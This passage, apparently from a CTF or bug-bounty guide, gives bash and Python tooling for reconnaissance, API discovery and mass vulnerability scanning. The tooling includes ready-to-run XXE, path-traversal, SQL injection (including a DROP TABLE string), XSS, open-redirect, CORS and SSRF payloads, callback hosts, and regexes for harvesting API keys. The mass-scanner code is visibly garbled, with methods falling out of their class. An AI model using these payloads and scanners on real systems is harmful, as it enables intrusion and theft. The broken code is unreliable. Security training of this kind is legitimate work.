Reconnaissance Report for $TARGET
Generated: $(date)
===========================================

SUMMARY:
--------
- Total Subdomains: $SUBDOMAIN_COUNT
- Live Hosts: $LIVE_COUNT
- Vulnerabilities Found: $(wc -l < nuclei_vulnerabilities.txt 2>/dev/null || echo "0")
- JavaScript Files: $(find js_files -name "*.js" | wc -l)
- Potential Secrets: $(wc -l < js_secrets.txt 2>/dev/null || echo "0")

FILES GENERATED:
----------------
- subdomains_all.txt        All discovered subdomains
- live_hosts.txt            Active HTTP/HTTPS hosts
- httpx_results.txt         Technology and status codes
- nmap_full.xml             Complete port scan results
- directory_scans/          Directory enumeration results
- js_files/                 Downloaded JavaScript files
- js_secrets.txt            Potential secrets in JS
- js_endpoints.txt          API endpoints from JS
- nuclei_vulnerabilities.txt Detected vulnerabilities

NEXT STEPS:
-----------
1. Review nuclei_vulnerabilities.txt for quick wins
2. Analyze js_secrets.txt for API keys/tokens
3. Test endpoints in js_endpoints.txt
4. Check directory_scans/ for interesting paths
5. Manual testing on high-value targets

===========================================
EOF

# Wait for background nmap to finish
wait $NMAP_PID 2>/dev/null

echo -e "\n[✓] Reconnaissance complete!"
echo "[*] Report saved to: $(pwd)/REPORT.txt"
echo "[*] Review findings and begin manual testing"
```

**Usage:**

```bash
# Make executable
chmod +x comprehensive_recon.sh

# Run reconnaissance

./comprehensive_recon.sh target.com

# Run with specific subdomain list

./comprehensive_recon.sh target.com < custom_subdomains.txt

# Run on multiple targets

cat targets.txt | while read domain; do ./comprehensive_recon.sh "$domain" done
````

### Automated API Endpoint Discovery

**Python script for intelligent API discovery:**

```python
#!/usr/bin/env python3
# api_discovery.py

import requests
import json
import re
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

class APIDiscovery:
    
    def __init__(self, target, threads=10):
        self.target = target
        self.threads = threads
        self.discovered_endpoints = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
    
    def discover_from_js(self, js_url):
        """Extract API endpoints from JavaScript files"""
        try:
            response = self.session.get(js_url, timeout=10)
            content = response.text
            
            # API endpoint patterns
            patterns = [
                r'["\']([/a-zA-Z0-9_-]*?/api/[a-zA-Z0-9/_-]+)["\']',
                r'["\']([/a-zA-Z0-9_-]*?/v\d+/[a-zA-Z0-9/_-]+)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                r'\.get\(["\']([^"\']+)["\']',
                r'\.post\(["\']([^"\']+)["\']',
                r'endpoint["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'url["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]
            
            endpoints = set()
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                endpoints.update(matches)
            
            return endpoints
            
        except Exception as e:
            print(f"Error processing {js_url}: {e}")
            return set()
    
    def discover_from_swagger(self):
        """Check for Swagger/OpenAPI documentation"""
        swagger_paths = [
            '/swagger.json',
            '/swagger.yaml',
            '/swagger-ui.html',
            '/api-docs',
            '/api/swagger.json',
            '/api/swagger.yaml',
            '/api-docs.json',
            '/v2/api-docs',
            '/v3/api-docs',
            '/openapi.json',
            '/openapi.yaml',
            '/docs',
            '/api/docs',
            '/documentation',
            '/redoc',
        ]
        
        endpoints = set()
        for path in swagger_paths:
            url = urljoin(self.target, path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found API documentation: {url}")
                    
                    # Parse Swagger/OpenAPI spec
                    try:
                        spec = response.json()
                        
                        # OpenAPI 3.x
                        if 'paths' in spec:
                            for path, methods in spec['paths'].items():
                                for method in methods.keys():
                                    if method.upper() in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                                        endpoints.add((path, method.upper()))
                        
                        # Swagger 2.0
                        elif 'swagger' in spec:
                            base_path = spec.get('basePath', '')
                            for path, methods in spec.get('paths', {}).items():
                                full_path = base_path + path
                                for method in methods.keys():
                                    endpoints.add((full_path, method.upper()))
                                    
                    except json.JSONDecodeError:
                        pass
                        
            except Exception as e:
                continue
        
        return endpoints
    
    def discover_from_graphql(self):
        """Check for GraphQL introspection"""
        graphql_paths = [
            '/graphql',
            '/api/graphql',
            '/v1/graphql',
            '/query',
            '/graphiql',
        ]
        
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                    queryType {
                        fields {
                            name
                        }
                    }
                    mutationType {
                        fields {
                            name
                        }
                    }
                }
            }
            """
        }
        
        endpoints = set()
        for path in graphql_paths:
            url = urljoin(self.target, path)
            try:
                response = self.session.post(
                    url, 
                    json=introspection_query,
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and '__schema' in data['data']:
                        print(f"[+] GraphQL introspection enabled: {url}")
                        
                        # Extract queries
                        if data['data']['__schema'].get('queryType'):
                            queries = data['data']['__schema']['queryType'].get('fields', [])
                            for query in queries:
                                endpoints.add((f"{path}?query={query['name']}", 'GRAPHQL'))
                        
                        # Extract mutations
                        if data['data']['__schema'].get('mutationType'):
                            mutations = data['data']['__schema']['mutationType'].get('fields', [])
                            for mutation in mutations:
                                endpoints.add((f"{path}?mutation={mutation['name']}", 'GRAPHQL'))
                                
            except Exception as e:
                continue
        
        return endpoints
    
    def brute_force_endpoints(self, wordlist):
        """Brute force API endpoints"""
        endpoints = []
        
        with open(wordlist, 'r') as f:
            words = [line.strip() for line in f if line.strip()]
        
        # Common API prefixes
        prefixes = ['', '/api', '/api/v1', '/api/v2', '/v1', '/v2']
        
        def test_endpoint(combination):
            prefix, word = combination
            url = urljoin(self.target, f"{prefix}/{word}")
            
            try:
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                # Interesting status codes
                if response.status_code in [200, 201, 202, 204, 301, 302, 401, 403, 405, 500]:
                    return {
                        'url': url,
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_type': response.headers.get('Content-Type', '')
                    }
            except:
                pass
            
            return None
        
        # Generate all combinations
        combinations = [(prefix, word) for prefix in prefixes for word in words]
        
        print(f"[*] Testing {len(combinations)} endpoint combinations...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_endpoint, combo): combo for combo in combinations}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    endpoints.append(result)
                    print(f"[+] Found: {result['url']} [{result['status']}]")
        
        return endpoints
    
    def discover_from_robots_sitemap(self):
        """Extract endpoints from robots.txt and sitemap.xml"""
        endpoints = set()
        
        # robots.txt
        try:
            robots_url = urljoin(self.target, '/robots.txt')
            response = self.session.get(robots_url, timeout=5)
            if response.status_code == 200:
                print("[+] Found robots.txt")
                # Extract disallowed paths
                for line in response.text.split('\n'):
                    if line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            endpoints.add(path)
        except:
            pass
        
        # sitemap.xml
        sitemap_paths = ['/sitemap.xml', '/sitemap_index.xml', '/sitemap-index.xml']
        for sitemap_path in sitemap_paths:
            try:
                sitemap_url = urljoin(self.target, sitemap_path)
                response = self.session.get(sitemap_url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found sitemap: {sitemap_path}")
                    # Extract URLs
                    urls = re.findall(r'<loc>(.*?)</loc>', response.text)
                    for url in urls:
                        parsed = urlparse(url)
                        if parsed.path:
                            endpoints.add(parsed.path)
            except:
                continue
        
        return endpoints
    
    def run_discovery(self, js_files=None, wordlist=None):
        """Run all discovery methods"""
        print(f"[*] Starting API discovery on {self.target}\n")
        
        all_endpoints = []
        
        # Method 1: JavaScript analysis
        if js_files:
            print("[*] Analyzing JavaScript files...")
            for js_file in js_files:
                endpoints = self.discover_from_js(js_file)
                if endpoints:
                    print(f"  [+] Found {len(endpoints)} endpoints in {js_file}")
                    all_endpoints.extend([(e, 'JS') for e in endpoints])
        
        # Method 2: Swagger/OpenAPI
        print("\n[*] Checking for API documentation...")
        swagger_endpoints = self.discover_from_swagger()
        if swagger_endpoints:
            all_endpoints.extend(swagger_endpoints)
        
        # Method 3: GraphQL
        print("\n[*] Checking for GraphQL endpoints...")
        graphql_endpoints = self.discover_from_graphql()
        if graphql_endpoints:
            all_endpoints.extend(graphql_endpoints)
        
        # Method 4: robots.txt and sitemap
        print("\n[*] Checking robots.txt and sitemap...")
        robots_endpoints = self.discover_from_robots_sitemap()
        if robots_endpoints:
            all_endpoints.extend([(e, 'ROBOTS') for e in robots_endpoints])
        
        # Method 5: Brute force
        if wordlist:
            print("\n[*] Brute forcing endpoints...")
            brute_endpoints = self.brute_force_endpoints(wordlist)
            all_endpoints.extend([(e['url'], f"BRUTE-{e['status']}") for e in brute_endpoints])
        
        return all_endpoints
    
    def save_results(self, endpoints, output_file):
        """Save discovered endpoints to file"""
        with open(output_file, 'w') as f:
            f.write("# API Discovery Results\n")
            f.write(f"# Target: {self.target}\n")
            f.write(f"# Total endpoints: {len(endpoints)}\n\n")
            
            for endpoint, source in endpoints:
                f.write(f"{endpoint}\t[{source}]\n")
        
        print(f"\n[✓] Results saved to {output_file}")
        print(f"[✓] Total endpoints discovered: {len(endpoints)}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Automated API Discovery Tool')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://target.com)')
    parser.add_argument('-j', '--js-files', nargs='+', help='JavaScript files to analyze')
    parser.add_argument('-w', '--wordlist', help='Wordlist for brute forcing')
    parser.add_argument('-o', '--output', default='api_endpoints.txt', help='Output file')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    
    args = parser.parse_args()
    
    discovery = APIDiscovery(args.target, threads=args.threads)
    endpoints = discovery.run_discovery(js_files=args.js_files, wordlist=args.wordlist)
    discovery.save_results(endpoints, args.output)
````

**Usage examples:**

```bash
# Basic discovery
python3 api_discovery.py -t https://target.com -o endpoints.txt

# With JavaScript analysis
python3 api_discovery.py -t https://target.com \
    -j https://target.com/static/app.js https://target.com/static/main.js

# With brute forcing
python3 api_discovery.py -t https://target.com \
    -w /usr/share/wordlists/api/api-endpoints.txt

# Complete discovery
python3 api_discovery.py -t https://target.com \
    -j $(cat js_urls.txt) \
    -w /usr/share/wordlists/api/api-endpoints.txt \
    --threads 20
```

### Automated Vulnerability Detection Pipeline

**Multi-tool vulnerability detection script:**

```bash
#!/bin/bash
# vuln_detection_pipeline.sh

TARGET=$1
OUTPUT_DIR="vulns_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Starting vulnerability detection pipeline on $TARGET"

# =====================================
# XSS Detection
# =====================================
echo -e "\n[+] Testing for XSS vulnerabilities"

# Dalfox
echo "  [*] Running Dalfox..."
echo "$TARGET" | dalfox pipe -o xss_dalfox.txt -b http://your-xss-hunter.com 2>/dev/null

# XSStrike
echo "  [*] Running XSStrike..."
python3 /opt/XSStrike/xsstrike.py -u "$TARGET" --crawl -l 2 \
    --skip --skip-dom --skip-poc -o xss_xsstrike.txt 2>/dev/null

# Kxss (from parameters)
echo "  [*] Finding reflected parameters..."
echo "$TARGET" | waybackurls | kxss | tee xss_reflected_params.txt 2>/dev/null

echo "  [✓] XSS testing complete"

# =====================================
# SQL Injection Detection
# =====================================
echo -e "\n[+] Testing for SQL Injection"

# SQLMap (automated)
echo "  [*] Running SQLMap..."
sqlmap -u "$TARGET" --batch --random-agent --level=2 --risk=2 \
    --output-dir=sqlmap_output --flush-session 2>/dev/null

# Ghauri (alternative SQLi tool)
echo "  [*] Running Ghauri..."
ghauri -u "$TARGET" --batch -o ghauri_output.txt 2>/dev/null

echo "  [✓] SQLi testing complete"

# =====================================
# SSRF Detection
# =====================================
echo -e "\n[+] Testing for SSRF"

# Find parameters that might be vulnerable
echo "  [*] Identifying potential SSRF parameters..."
echo "$TARGET" | waybackurls | grep -E "\?(url|uri|path|file|redirect|proxy|callback|fetch|data|src)" > potential_ssrf.txt

# Test with collaborator/webhook
COLLAB_URL="http://your-collaborator.com"

cat potential_ssrf.txt | while read url; do
    # Replace parameter value with collaborator URL
    test_url=$(echo "$url" | sed -E "s/(url|uri|path|redirect)=[^&]*/\1=$COLLAB_URL/g")
    
    echo "Testing: $test_url" >> ssrf_tests.txt
    curl -s "$test_url" -o /dev/null 2>&1
done

echo "  [✓] SSRF testing complete (check collaborator for hits)"

# =====================================
# Open Redirect Detection
# =====================================
echo -e "\n[+] Testing for Open Redirects"

echo "  [*] Finding redirect parameters..."
echo "$TARGET" | waybackurls | grep -E "\?(url|redirect|next|return|dest|destination|redir)" > potential_redirects.txt

# Test open redirects
cat potential_redirects.txt | while read url; do
    # Test with various payloads
    for payload in "https://evil.com" "//evil.com" "///evil.com"; do
        test_url=$(echo "$url" | sed -E "s/(url|redirect|next)=[^&]*/\1=$payload/g")
        
        response=$(curl -s -I -L "$test_url" 2>&1 | grep -i "Location:")
        
        if echo "$response" | grep -q "evil.com"; then
            echo "[!] FOUND: $test_url" | tee -a open_redirects.txt
        fi
    done
done

echo "  [✓] Open redirect testing complete"

# =====================================
# CORS Misconfiguration
# =====================================
echo -e "\n[+] Testing for CORS misconfigurations"

echo "  [*] Checking CORS headers..."
curl -s -I "$TARGET" -H "Origin: https://evil.com" | grep -i "Access-Control" > cors_test1.txt

curl -s -I "$TARGET" -H "Origin: null" | grep -i "Access-Control" > cors_test2.txt

# Check if Access-Control-Allow-Origin reflects input
if grep -q "https://evil.com" cors_test1.txt; then
    echo "[!] VULNERABLE: CORS reflects arbitrary origin" | tee -a cors_findings.txt
fi

if grep -q "null" cors_test2.txt; then
    echo "[!] VULNERABLE: CORS allows null origin" | tee -a cors_findings.txt
fi

echo "  [✓] CORS testing complete"

# =====================================
# XXE Detection
# =====================================
echo -e "\n[+] Testing for XXE"

# Find XML upload/processing endpoints
echo "  [*] Finding XML processing endpoints..."
echo "$TARGET" | waybackurls | grep -iE "\.(xml|rss|atom|feed)" > xml_endpoints.txt

# Test XXE payload
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

cat xml_endpoints.txt | while read endpoint; do
    response=$(curl -s -X POST "$endpoint" \
        -H "Content-Type: application/xml" \
        -d "$XXE_PAYLOAD")
    
    if echo "$response" | grep -q "root:"; then
        echo "[!] XXE FOUND: $endpoint" | tee -a xxe_findings.txt
    fi
done

echo "  [✓] XXE testing complete"

# =====================================
# LFI/Path Traversal
# =====================================
echo -e "\n[+] Testing for LFI/Path Traversal"

# dotdotpwn
echo "  [*] Running dotdotpwn..."
dotdotpwn -m http -h "$(echo $TARGET | sed 's|https\?://||')" \
    -k "root:" -f /tmp/dotdotpwn_output.txt 2>/dev/null

# Manual testing
echo "  [*] Testing path traversal payloads..."
PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
)

for payload in "${PAYLOADS[@]}"; do
    test_url="${TARGET}?file=$payload"
    response=$(curl -s "$test_url")
    
    if echo "$response" | grep -q "root:"; then
        echo "[!] LFI FOUND with payload: $payload" | tee -a lfi_findings.txt
    fi
done

echo "  [✓] LFI testing complete"

# =====================================
# Command Injection
# =====================================
echo -e "\n[+] Testing for Command Injection"

# Commix
echo "  [*] Running Commix..."
commix -u "$TARGET" --batch --level=2 --output-dir=commix_output 2>/dev/null

echo "  [✓] Command injection testing complete"

# =====================================
# Nuclei (comprehensive scanner)
# =====================================
echo -e "\n[+] Running Nuclei comprehensive scan"

nuclei -u "$TARGET" \
    -severity critical,high,medium \
    -tags cve,exposure,misconfiguration,injection \
    -o nuclei_all_vulns.txt 2>/dev/null

echo "  [✓] Nuclei scan complete"

# =====================================
# Generate Summary Report
# =====================================
echo -e "\n[+] Generating vulnerability report"

cat > VULNERABILITY_REPORT.txt << EOF
===========================================
Vulnerability Detection Report
Target: $TARGET
Date: $(date)
===========================================

XSS FINDINGS:
$([ -s xss_dalfox.txt ] && cat xss_dalfox.txt || echo "None found")
$([ -s xss_xsstrike.txt ] && cat xss_xsstrike.txt || echo "")

SQL INJECTION FINDINGS:
$([ -d sqlmap_output ] && find sqlmap_output -name "*.csv" -exec cat {} \; || echo "None found")

SSRF TESTS:
$([ -s ssrf_tests.txt ] && wc -l ssrf_tests.txt || echo "0") URLs tested
Check collaborator for callbacks

OPEN REDIRECT FINDINGS:
$([ -s open_redirects.txt ] && cat open_redirects.txt || echo "None found")

CORS MISCONFIGURATIONS:
$([ -s cors_findings.txt ] && cat cors_findings.txt || echo "None found")

XXE FINDINGS:
$([ -s xxe_findings.txt ] && cat xxe_findings.txt || echo "None found")

LFI/PATH TRAVERSAL:
$([ -s lfi_findings.txt ] && cat lfi_findings.txt || echo "None found")

NUCLEI HIGH-SEVERITY FINDINGS:
$([ -s nuclei_all_vulns.txt ] && grep -E "\[critical\]|\[high\]" nuclei_all_vulns.txt || echo "None found")

===========================================
NEXT STEPS:
1. Manual verification of automated findings
2. Exploit development for confirmed vulnerabilities
3. Test for business logic flaws
4. Check authentication/authorization issues
===========================================
EOF

echo -e "\n[✓] Vulnerability detection complete!"
echo "[*] Report saved to: $(pwd)/VULNERABILITY_REPORT.txt"
```

**Usage:**

```bash
# Make executable
chmod +x vuln_detection_pipeline.sh

# Run on single target
./vuln_detection_pipeline.sh https://target.com

# Run on multiple targets
cat targets.txt | while read target; do
    ./vuln_detection_pipeline.sh "$target"
done
```

## Mass Vulnerability Detection

Mass vulnerability detection involves testing multiple targets simultaneously or scanning large attack surfaces for specific vulnerability classes.

### Nuclei Mass Scanning

**Custom Nuclei templates for CTF-specific vulnerabilities:**

```yaml
# custom-templates/api-key-exposure.yaml
id: api-key-exposure-enhanced

info:
  name: Enhanced API Key Exposure Detection
  author: ctf-team
  severity: critical
  description: Detects exposed API keys in various formats
  tags: exposure,api,keys

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/app.js"
      - "{{BaseURL}}/main.js"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.php"
      
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - 'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']'
          - 'AKIA[0-9A-Z]{16}'  # AWS
          - 'AIza[0-9A-Za-z-_]{35}'  # Google
          - 'sk-[a-zA-Z0-9]{32,}'  # OpenAI
          - 'ghp_[a-zA-Z0-9]{36}'  # GitHub
          - 'xox[baprs]-[0-9a-zA-Z-]{10,}'  # Slack

      - type: word
        words:
          - "api_key"
          - "apikey"
          - "secret_key"
          - "access_token"
```

```yaml
# custom-templates/admin-panel-discovery.yaml
id: admin-panel-discovery

info:
  name: Admin Panel Discovery
  author: ctf-team
  severity: info
  tags: discovery,admin,panel

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/admin.php"
      - "{{BaseURL}}/admin/login"
      - "{{BaseURL}}/wp-admin"
      - "{{BaseURL}}/adminpanel"
      - "{{BaseURL}}/control"
      - "{{BaseURL}}/dashboard"
      - "{{BaseURL}}/manager"
      - "{{BaseURL}}/admin_area"
      - "{{BaseURL}}/admin_login"
      - "{{BaseURL}}/moderator"
      - "{{BaseURL}}/webadmin"
      - "{{BaseURL}}/adminarea"
      - "{{BaseURL}}/adm"
      
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 403
          - 401
          
      - type: word
        words:
          - "admin"
          - "login"
          - "dashboard"
          - "authentication"
        condition: or
```

```yaml
# custom-templates/debug-exposure.yaml
id: debug-mode-exposure

info:
  name: Debug Mode Exposure
  author: ctf-team
  severity: medium
  tags: exposure,debug,misconfiguration

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/?debug=true"
      - "{{BaseURL}}/?debug=1"
      - "{{BaseURL}}/debug"
      
    matchers:
      - type: word
        words:
          - "SQLSTATE["
          - "mysqli_"
          - "Warning:"
          - "Fatal error:"
          - "stack trace"
          - "Query failed:"
          - "syntax error"
          - "Undefined index:"
        condition: or
        
      - type: regex
        regex:
          - '/var/www/[a-zA-Z0-9/_.-]+'
          - 'C:\\\\[a-zA-Z0-9\\\\._-]+'
```

**Mass scanning with Nuclei:**

```bash
# Scan multiple targets
cat targets.txt | nuclei -t custom-templates/ -o mass_scan_results.txt

# Scan with specific tags
cat targets.txt | nuclei -tags cve,exposure,injection -severity critical,high

# Parallel scanning
cat targets.txt | nuclei -c 50 -rate-limit 100 -t /root/nuclei-templates/

# Scan specific vulnerability class across many targets
cat targets.txt | nuclei -t nuclei-templates/vulnerabilities/sqli/ -o sqli_findings.txt

# Generate detailed report
cat targets.txt | nuclei -t custom-templates/ -json -o results.json

# Parse JSON results
cat results.json | jq '.[] | select(.info.severity=="critical") | {target: .host, template: .["template-id"], matched: .matched-at}'
```

### Parallel Vulnerability Testing Framework

**Python framework for mass testing:**

```python
#!/usr/bin/env python3
# mass_vuln_scanner.py

import asyncio
import aiohttp
import json
from typing import List, Dict
import argparse
from urllib.parse import urljoin, urlparse

class MassVulnScanner:
    
    def __init__(self, targets: List[str], concurrency=50):
        self.targets = targets
        self.concurrency = concurrency
        self.results = []
        self.semaphore = asyncio.Semaphore(concurrency)
    
    async def fetch(self, session, url, method='GET', **kwargs):
        """Async HTTP request with error handling"""
        try:
            async with self.semaphore:
                async with session.request(method, url, timeout=10, **kwargs) as response:
                    text = await response.text()
                    return {
                        'url': url,
                        'status': response.status,
                        'headers': dict(response.headers),
                        'body': text,
                        'length': len(text)
                    }
        except Exception as e:
            return {'url': url, 'error': str(e)}
    
    async def test_sql_injection(self, session, target):
        """Test for SQL injection"""
        findings = []
        
        # SQL error patterns
        error_patterns = [
            "SQL syntax",
            "mysql_fetch",
            "mysqli_",
            "SQLSTATE",
            "ORA-",
            "PostgreSQL",
            "Microsoft SQL Server",
        ]
        
        # SQL injection payloads
        payloads = ["'", "\"", "1' OR '1'='1", "1' AND '1'='2", "'; DROP TABLE--"]
        
        for payload in payloads:
            test_url = f"{target}?id={payload}"
            result = await self.fetch(session, test_url)
            
            if 'body' in result:
                for pattern in error_patterns:
                    if pattern in result['body']:
                        findings.append({
                            'target': target,
                            'vulnerability': 'sql_injection',
                            'payload': payload,
                            'evidence': pattern,
                            'severity': 'high'
                        })
                        break
        
        return findings
    
    async def test_xss(self, session, target):
        """Test for XSS"""
        findings = []
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            test_url = f"{target}?q={payload}"
            result = await self.fetch(session, test_url)
            
            if 'body' in result and payload in result['body']:
                findings.append({
                    'target': target,
                    'vulnerability': 'xss_reflected',
                    'payload': payload,
                    'severity': 'medium'
                })
        
        return findings
    
    async def test_open_redirect(self, session, target):
        """Test for open redirect"""
        findings = []
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'dest', 'redir'] redirect_payloads = [ 'https://evil.com', '//evil.com', '///evil.com', 'https:evil.com', '\evil.com' ]

    for param in redirect_params:
        for payload in redirect_payloads:
            test_url = f"{target}?{param}={payload}"
            result = await self.fetch(session, test_url, allow_redirects=False)
            
            if 'headers' in result:
                location = result['headers'].get('Location', '')
                if 'evil.com' in location:
                    findings.append({
                        'target': target,
                        'vulnerability': 'open_redirect',
                        'parameter': param,
                        'payload': payload,
                        'redirect_to': location,
                        'severity': 'medium'
                    })
    
    return findings

async def test_cors_misconfiguration(self, session, target):
    """Test for CORS misconfiguration"""
    findings = []
    
    test_origins = [
        'https://evil.com',
        'null',
        f"{target}.evil.com",
        f"evil{target}"
    ]
    
    for origin in test_origins:
        result = await self.fetch(
            session, 
            target,
            headers={'Origin': origin}
        )
        
        if 'headers' in result:
            acao = result['headers'].get('Access-Control-Allow-Origin', '')
            acac = result['headers'].get('Access-Control-Allow-Credentials', '')
            
            # Vulnerable if reflects origin with credentials
            if origin in acao and 'true' in acac.lower():
                findings.append({
                    'target': target,
                    'vulnerability': 'cors_misconfiguration',
                    'reflected_origin': origin,
                    'allows_credentials': True,
                    'severity': 'high'
                })
            
            # Vulnerable if allows null with credentials
            elif 'null' in acao and 'true' in acac.lower():
                findings.append({
                    'target': target,
                    'vulnerability': 'cors_null_origin',
                    'severity': 'high'
                })
    
    return findings

async def test_security_headers(self, session, target):
    """Test for missing security headers"""
    findings = []
    
    required_headers = {
        'X-Frame-Options': 'clickjacking protection',
        'X-Content-Type-Options': 'MIME sniffing protection',
        'Strict-Transport-Security': 'HTTPS enforcement',
        'Content-Security-Policy': 'XSS protection',
        'X-XSS-Protection': 'XSS filter'
    }
    
    result = await self.fetch(session, target)
    
    if 'headers' in result:
        for header, purpose in required_headers.items():
            if header not in result['headers']:
                findings.append({
                    'target': target,
                    'vulnerability': 'missing_security_header',
                    'header': header,
                    'purpose': purpose,
                    'severity': 'info'
                })
    
    return findings

async def test_sensitive_exposure(self, session, target):
    """Test for sensitive file/directory exposure"""
    findings = []
    
    sensitive_paths = [
        '/.git/config',
        '/.env',
        '/.aws/credentials',
        '/config.json',
        '/config.php.bak',
        '/.htaccess',
        '/web.config',
        '/phpinfo.php',
        '/server-status',
        '/admin',
        '/backup.sql',
        '/database.sql',
        '/.DS_Store',
        '/composer.json',
        '/package.json',
    ]
    
    for path in sensitive_paths:
        test_url = urljoin(target, path)
        result = await self.fetch(session, test_url)
        
        if result.get('status') == 200 and result.get('length', 0) > 0:
            findings.append({
                'target': target,
                'vulnerability': 'sensitive_file_exposure',
                'path': path,
                'url': test_url,
                'severity': 'medium'
            })
    
    return findings

async def test_http_methods(self, session, target):
    """Test for dangerous HTTP methods"""
    findings = []
    
    dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'OPTIONS', 'CONNECT']
    
    for method in dangerous_methods:
        result = await self.fetch(session, target, method=method)
        
        if result.get('status') not in [405, 501]:
            findings.append({
                'target': target,
                'vulnerability': 'dangerous_http_method',
                'method': method,
                'status': result.get('status'),
                'severity': 'medium'
            })
    
    return findings

async def scan_target(self, session, target):
    """Run all tests on a single target"""
    print(f"[*] Scanning {target}")
    
    all_findings = []
    
    # Run all test methods
    tests = [
        self.test_sql_injection(session, target),
        self.test_xss(session, target),
        self.test_open_redirect(session, target),
        self.test_cors_misconfiguration(session, target),
        self.test_security_headers(session, target),
        self.test_sensitive_exposure(session, target),
        self.test_http_methods(session, target),
    ]
    
    results = await asyncio.gather(*tests, return_exceptions=True)
    
    for result in results:
        if isinstance(result, list):
            all_findings.extend(result)
        elif isinstance(result, Exception):
            print(f"[!] Error scanning {target}: {result}")
    
    return all_findings

async def run_scan(self):
    """Main scanning loop"""
    connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [self.scan_target(session, target) for target in self.targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                self.results.extend(result)
    
    return self.results

def save_results(self, output_file):
    """Save results to JSON file"""
    with open(output_file, 'w') as f:
        json.dump(self.results, f, indent=2)
    
    print(f"\n[✓] Scan complete!")
    print(f"[*] Total findings: {len(self.results)}")
    print(f"[*] Results saved to: {output_file}")
    
    # Print summary
    by_severity = {}
    for finding in self.results:
        severity = finding.get('severity', 'unknown')
        by_severity[severity] = by_severity.get(severity, 0) + 1
    
    print("\n[*] Findings by severity:")
    for severity, count in sorted(by_severity.items(), key=lambda x: x[1], reverse=True):
        print(f"    {severity}: {count}")

async def main(): 
	parser = argparse.ArgumentParser(description='Mass Vulnerability Scanner')
	parser.add_argument('-t', '--targets', required=True, help='File containing target URLs') 
	parser.add_argument('-o', '--output', default='mass_scan_results.json', help='Output file') 
	parser.add_argument('-c', '--concurrency', type=int, default=50, help='Concurrent requests')
	args = parser.parse_args()

	# Load targets
	with open(args.targets, 'r') as f:
	    targets = [line.strip() for line in f if line.strip()]
	
	print(f"[*] Loaded {len(targets)} targets")
	print(f"[*] Concurrency: {args.concurrency}")
	print(f"[*] Starting scan...\n")
	
	scanner = MassVulnScanner(targets, concurrency=args.concurrency)
	await scanner.run_scan()
	scanner.save_results(args.output)

if __name__ == "__main__":
	asyncio.run(main())
````

**Usage:**

```bash
# Create targets file
cat > targets.txt << EOF
https://target1.com
https://target2.com
https://target3.com
EOF

# Run mass scan
python3 mass_vuln_scanner.py -t targets.txt -o results.json -c 100

# Filter critical findings
cat results.json | jq '.[] | select(.severity=="high" or .severity=="critical")'

# Group by vulnerability type
cat results.json | jq 'group_by(.vulnerability) | map({vuln: .[0].vulnerability, count: length})'

# Extract SQL injection findings
cat results.json | jq '.[] | select(.vulnerability=="sql_injection")'
````

### Subdomain Takeover Detection at Scale

**Automated subdomain takeover scanner:**

```python
#!/usr/bin/env python3
# subdomain_takeover.py

import asyncio
import aiohttp
import aiodns
import json
from typing import List, Dict

class SubdomainTakeoverScanner:
    
    # Fingerprints for common services
    FINGERPRINTS = {
        'github': {
            'cname': ['github.io'],
            'response': ['There isn\'t a GitHub Pages site here.'],
            'status': [404]
        },
        'heroku': {
            'cname': ['herokuapp.com'],
            'response': ['No such app'],
            'status': [404]
        },
        'aws_s3': {
            'cname': ['s3.amazonaws.com', 's3-website'],
            'response': ['NoSuchBucket', 'The specified bucket does not exist'],
            'status': [404]
        },
        'azure': {
